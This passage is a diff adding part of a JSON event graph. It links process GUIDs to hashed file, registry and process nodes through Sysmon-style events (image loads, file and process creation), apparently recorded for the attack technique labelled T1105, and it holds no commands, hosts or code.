+      "id": "edge:T1105:258",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:e6beef42f39141f35cc0aaed3becfbe793c4d8f0010f55f892372773cbd29923:11",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:e6beef42f39141f35cc0aaed3becfbe793c4d8f0010f55f892372773cbd29923:11",
+      "label": "File Create",
+      "type": "File Create",
+      "properties": {
+        "action": "File Create",
+        "event_id": "11",
+        "timestamp": "2026-05-06T14:37:39.704582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:259",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:1e1142cef1f05bc99765a570ef2232528c20dc9492224f4ce842010205a0cb7e:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:1e1142cef1f05bc99765a570ef2232528c20dc9492224f4ce842010205a0cb7e:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.704582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:260",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:be454fd51b4ebeb50829a5a107ca89c5af79aeb5c5d1d2cd40547498f95233fb:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:be454fd51b4ebeb50829a5a107ca89c5af79aeb5c5d1d2cd40547498f95233fb:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.704582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:261",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:7231190315d39551649f4f9da449a9e30e1a887595cd95a5847553e5927c9596:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:7231190315d39551649f4f9da449a9e30e1a887595cd95a5847553e5927c9596:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.705582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:262",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:160eab8f24686d769c9bfa8cadb5e632c358366e7ec2eaf3373a2ef4d731629e:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:160eab8f24686d769c9bfa8cadb5e632c358366e7ec2eaf3373a2ef4d731629e:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.705582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:263",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:c5943c7cede5876ed03f38261c4ec12c11a4f669afdb57b85314c1b5a48f8cd6:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:c5943c7cede5876ed03f38261c4ec12c11a4f669afdb57b85314c1b5a48f8cd6:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.705582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:264",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:ca605d973177f52dcd79632b11bdc368190d6c4f16d8f0ef7e6c8ed0829b4c5d:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:ca605d973177f52dcd79632b11bdc368190d6c4f16d8f0ef7e6c8ed0829b4c5d:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.705582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:265",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "Registry:91a5257771cc01f0890f539d25d891562f40d420bb2931551ba5793d146f9cd2:12",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "Registry:91a5257771cc01f0890f539d25d891562f40d420bb2931551ba5793d146f9cd2:12",
+      "label": "Registry Object Create/Delete",
+      "type": "Registry Object Create/Delete",
+      "properties": {
+        "action": "Registry Object Create/Delete",
+        "event_id": "12",
+        "timestamp": "2026-05-06T14:37:39.705582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:266",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:fc0ef9da2f5aafc20ee58a746df609b9abda1acfe9ff986ef9da07354d16cd30:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:fc0ef9da2f5aafc20ee58a746df609b9abda1acfe9ff986ef9da07354d16cd30:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.705582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:267",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:428506138d0bf77848c28449fcb8ba88ffe60393e5bbee010b60571c30004e86:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:428506138d0bf77848c28449fcb8ba88ffe60393e5bbee010b60571c30004e86:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.706582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:268",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:6741bbd10169c53837e451e1512a25d8d4d4073c784ea7b4c5112a3a4cecbd9e:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:6741bbd10169c53837e451e1512a25d8d4d4073c784ea7b4c5112a3a4cecbd9e:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.706582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:269",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:a9f673787ab340d6ef4d056f268e369ad01971bdadee80a29ef5c155e82e3ff8:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:a9f673787ab340d6ef4d056f268e369ad01971bdadee80a29ef5c155e82e3ff8:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.706582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:270",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:139f7a6ced96b702818ddfea2736ef671008fda2b4d1c63e1f6f5aecaa23d8e6:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:139f7a6ced96b702818ddfea2736ef671008fda2b4d1c63e1f6f5aecaa23d8e6:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.706582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:271",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:f5265318b5f1148ffbbe24ca0307cef02f129ded08cbc18fb05497489ec1f5b5:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:f5265318b5f1148ffbbe24ca0307cef02f129ded08cbc18fb05497489ec1f5b5:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.706582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:272",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:f554777f756da45f3b15702376fb6163958555c5ce906ee07473cc27c12d441f:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:f554777f756da45f3b15702376fb6163958555c5ce906ee07473cc27c12d441f:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.707582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:273",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:7fb66dd0e5d2c34be98c06a87e5227258fe8f1b20f8186a695cf39e707f77c28:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:7fb66dd0e5d2c34be98c06a87e5227258fe8f1b20f8186a695cf39e707f77c28:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.707582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:274",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:0165b9905b4a34eb987f8aeb6126ed5a2f9d28d6bde7549223e7de947e645a75:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:0165b9905b4a34eb987f8aeb6126ed5a2f9d28d6bde7549223e7de947e645a75:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.707582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:275",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:85b4704cb6b28a1cf25850582ece871fe948f8d1677ff5b8836dbe7bb2f3e180:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:85b4704cb6b28a1cf25850582ece871fe948f8d1677ff5b8836dbe7bb2f3e180:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.707582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:276",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:eaf2da9d52e781ed01fb925d0408d3c284d0876a7df0e9685f75a2df715f33a2:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:eaf2da9d52e781ed01fb925d0408d3c284d0876a7df0e9685f75a2df715f33a2:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.707582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:277",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:9e3ffa11adf2daa2ca57aadcea100f1eced847277249401b7938105776b18088:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:9e3ffa11adf2daa2ca57aadcea100f1eced847277249401b7938105776b18088:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.707582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:278",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:b60d30145077a0dc36fa59c19b14d53a86694490ed265c7f928ded3122ef373a:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:b60d30145077a0dc36fa59c19b14d53a86694490ed265c7f928ded3122ef373a:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.707582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:279",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:b2a83787692d9f5ec141753f101524764ea3b8ed60a1bd0cd2417cd93829fff8:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:b2a83787692d9f5ec141753f101524764ea3b8ed60a1bd0cd2417cd93829fff8:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.707582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:280",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:9645a0699b090a2c814057f9add85dd0473c7d36ac237d47ac9d286dc2555430:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:9645a0699b090a2c814057f9add85dd0473c7d36ac237d47ac9d286dc2555430:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.708582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:281",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:4d40a8b621a06f30abe4a4ecfd9129953992a18dfb481163b1bf9d434ee521dc:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:4d40a8b621a06f30abe4a4ecfd9129953992a18dfb481163b1bf9d434ee521dc:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.708582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:282",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:800e466bba30b6e86d963cc81c687688dca4fd6aa7eb181e5c5271f4acc665b4:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:800e466bba30b6e86d963cc81c687688dca4fd6aa7eb181e5c5271f4acc665b4:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.708582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:283",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:d000c4545f131a56947708a4d526e884a9bd6578c0ec2d735e4e4e23749c6df2:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:d000c4545f131a56947708a4d526e884a9bd6578c0ec2d735e4e4e23749c6df2:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.708582+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:284",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:68b3c8f8ab782e0642adc09bae2bacadb161b2fba9ead93f7569fc8ff03f0676:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:68b3c8f8ab782e0642adc09bae2bacadb161b2fba9ead93f7569fc8ff03f0676:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.709085+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:285",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:884b181573300ba4a65b5ae721a3450db12c6c2d4fab187a3bc6e28ff8311ed9:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:884b181573300ba4a65b5ae721a3450db12c6c2d4fab187a3bc6e28ff8311ed9:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.709085+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:286",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:1243375dbdd9510e3f2a74b8f10f7e82b5108f549e5537481acc53b7b22a1371:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:1243375dbdd9510e3f2a74b8f10f7e82b5108f549e5537481acc53b7b22a1371:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.709085+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:287",
+      "source": "Process:{8B6011A9-C6FA-616E-9C35-01000000F101}:1",
+      "target": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:10",
+      "from": "Process:{8B6011A9-C6FA-616E-9C35-01000000F101}:1",
+      "to": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:10",
+      "label": "ProcessAccess",
+      "type": "ProcessAccess",
+      "properties": {
+        "action": "ProcessAccess",
+        "event_id": "10",
+        "timestamp": "2026-05-06T14:37:39.709085+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:288",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:19472e477d247f4145673e38acf57b83f708b61266308dea6f4e2b3b47b7ce59:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:19472e477d247f4145673e38acf57b83f708b61266308dea6f4e2b3b47b7ce59:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.709085+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:289",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:06f632cae2bed7616797c0603a9502bf7f67eb41b717e221d150252f09a0178a:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:06f632cae2bed7616797c0603a9502bf7f67eb41b717e221d150252f09a0178a:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.709085+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:290",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:5b462892012eff059a85498f6863d643217009c3f9e07f35e71e72b9134c1869:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:5b462892012eff059a85498f6863d643217009c3f9e07f35e71e72b9134c1869:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.709085+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:291",
+      "source": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "target": "File:6e23e41705c933904a855fb517b24075468eb5d22501ebc71d4ecbdedbdbd19a:7",
+      "from": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "to": "File:6e23e41705c933904a855fb517b24075468eb5d22501ebc71d4ecbdedbdbd19a:7",
+      "label": "Image Loaded",
+      "type": "Image Loaded",
+      "properties": {
+        "action": "Image Loaded",
+        "event_id": "7",
+        "timestamp": "2026-05-06T14:37:39.710090+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:292",
+      "source": "Process:{8B6011A9-F329-616E-043B-01000000F101}:1",
+      "target": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "from": "Process:{8B6011A9-F329-616E-043B-01000000F101}:1",
+      "to": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.711089+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:293",
+      "source": "Process:{8B6011A9-F32A-616E-073B-01000000F101}:1",
+      "target": "File:2ffcceaca489b62f08144fe6ae8d9c9875b00895f39dd257b36fb40d6eb80988:11",
+      "from": "Process:{8B6011A9-F32A-616E-073B-01000000F101}:1",
+      "to": "File:2ffcceaca489b62f08144fe6ae8d9c9875b00895f39dd257b36fb40d6eb80988:11",
+      "label": "File Create",
+      "type": "File Create",
+      "properties": {
+        "action": "File Create",
+        "event_id": "11",
+        "timestamp": "2026-05-06T14:37:39.711089+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:294",
+      "source": "Process:{8B6011A9-F329-616E-043B-01000000F101}:1",
+      "target": "Process:{8B6011A9-F32A-616E-073B-01000000F101}:1",
+      "from": "Process:{8B6011A9-F329-616E-043B-01000000F101}:1",
+      "to": "Process:{8B6011A9-F32A-616E-073B-01000000F101}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.715089+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:296",
+      "source": "Process:{8B6011A9-F32A-616E-063B-01000000F101}:1",
+      "target": "File:d3ed69ac19b73b46deb7f9d6ae08b1cabe9c64d0534e1ed3cc8be6b7c4dd6bb8:23",
+      "from": "Process:{8B6011A9-F32A-616E-063B-01000000F101}:1",
+      "to": "File:d3ed69ac19b73b46deb7f9d6ae08b1cabe9c64d0534e1ed3cc8be6b7c4dd6bb8:23",
+      "label": "File Delete (archived)",
+      "type": "File Delete (archived)",
+      "properties": {
+        "action": "File Delete (archived)",
+        "event_id": "23",
+        "timestamp": "2026-05-06T14:37:39.716089+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:297",
+      "source": "Process:{8B6011A9-F329-616E-043B-01000000F101}:1",
+      "target": "Process:{8B6011A9-F32A-616E-063B-01000000F101}:1",
+      "from": "Process:{8B6011A9-F329-616E-043B-01000000F101}:1",
+      "to": "Process:{8B6011A9-F32A-616E-063B-01000000F101}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.721089+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:298",
+      "source": "Process:{8B6011A9-F329-616E-043B-01000000F101}:1",
+      "target": "Process:{8B6011A9-F32A-616E-053B-01000000F101}:1",
+      "from": "Process:{8B6011A9-F329-616E-043B-01000000F101}:1",
+      "to": "Process:{8B6011A9-F32A-616E-053B-01000000F101}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.725089+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:299",
+      "source": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+      "target": "Process:{8B6011A9-E4B7-618B-8EA5-04000000F101}:1",
+      "from": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+      "to": "Process:{8B6011A9-E4B7-618B-8EA5-04000000F101}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.729089+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:300",
+      "source": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+      "target": "Process:{8B6011A9-E4F2-618B-96A5-04000000F101}:1",
+      "from": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+      "to": "Process:{8B6011A9-E4F2-618B-96A5-04000000F101}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.732089+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:301",
+      "source": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+      "target": "Process:{8B6011A9-E4FA-618B-97A5-04000000F101}:1",
+      "from": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+      "to": "Process:{8B6011A9-E4FA-618B-97A5-04000000F101}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.736089+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:302",
+      "source": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+      "target": "Process:{8B6011A9-E58D-618B-A9A5-04000000F101}:1",
+      "from": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+      "to": "Process:{8B6011A9-E58D-618B-A9A5-04000000F101}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.738089+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:303",
+      "source": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+      "target": "Process:{8B6011A9-E592-618B-AEA5-04000000F101}:1",
+      "from": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+      "to": "Process:{8B6011A9-E592-618B-AEA5-04000000F101}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.741089+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:304",
+      "source": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+      "target": "Process:{8B6011A9-E59F-618B-AFA5-04000000F101}:1",
+      "from": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+      "to": "Process:{8B6011A9-E59F-618B-AFA5-04000000F101}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.745089+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:305",
+      "source": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
+      "target": "Process:{8B6011A9-E695-618B-D0A5-04000000F101}:1",
+      "from": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
+      "to": "Process:{8B6011A9-E695-618B-D0A5-04000000F101}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.748088+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:root:Process:{00000000-0000-0000-0000-000000000000}:1",
+      "source": "Technique:T1105",
+      "target": "Process:{00000000-0000-0000-0000-000000000000}:1",
+      "from": "Technique:T1105",
+      "to": "Process:{00000000-0000-0000-0000-000000000000}:1",
+      "label": "HAS_ROOT",
+      "type": "HAS_ROOT",
+      "properties": {
+        "action": "HAS_ROOT",
+        "event_id": "",
+        "timestamp": ""
+      }
+    },
+    {
+      "id": "edge:T1105:root:Process:{38b9f94a-6af3-6754-0b74-000000002f03}:1",
+      "source": "Technique:T1105",
+      "target": "Process:{38b9f94a-6af3-6754-0b74-000000002f03}:1",
+      "from": "Technique:T1105",
+      "to": "Process:{38b9f94a-6af3-6754-0b74-000000002f03}:1",
+      "label": "HAS_ROOT",
+      "type": "HAS_ROOT",
+      "properties": {
+        "action": "HAS_ROOT",
+        "event_id": "",
+        "timestamp": ""
+      }
+    },
+    {
+      "id": "edge:T1105:root:Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "source": "Technique:T1105",
+      "target": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "from": "Technique:T1105",
+      "to": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "label": "HAS_ROOT",
+      "type": "HAS_ROOT",
+      "properties": {
+        "action": "HAS_ROOT",
+        "event_id": "",
+        "timestamp": ""
+      }
+    },
+    {
+      "id": "edge:T1105:root:Process:{896A638B-B3FF-605B-8069-00000000AE01}:1",
+      "source": "Technique:T1105",
+      "target": "Process:{896A638B-B3FF-605B-8069-00000000AE01}:1",
+      "from": "Technique:T1105",
+      "to": "Process:{896A638B-B3FF-605B-8069-00000000AE01}:1",
+      "label": "HAS_ROOT",
+      "type": "HAS_ROOT",
+      "properties": {
+        "action": "HAS_ROOT",
+        "event_id": "",
+        "timestamp": ""
+      }
+    },
+    {
+      "id": "edge:T1105:root:Process:{896A638B-B5C8-6058-0B00-00000000AE01}:1",
+      "source": "Technique:T1105",
+      "target": "Process:{896A638B-B5C8-6058-0B00-00000000AE01}:1",
+      "from": "Technique:T1105",
+      "to": "Process:{896A638B-B5C8-6058-0B00-00000000AE01}:1",
+      "label": "HAS_ROOT",
+      "type": "HAS_ROOT",
+      "properties": {
+        "action": "HAS_ROOT",
+        "event_id": "",
+        "timestamp": ""
+      }
+    },
+    {
+      "id": "edge:T1105:root:Process:{896A638B-B5CB-6058-1600-00000000AE01}:1",
+      "source": "Technique:T1105",
+      "target": "Process:{896A638B-B5CB-6058-1600-00000000AE01}:1",
+      "from": "Technique:T1105",
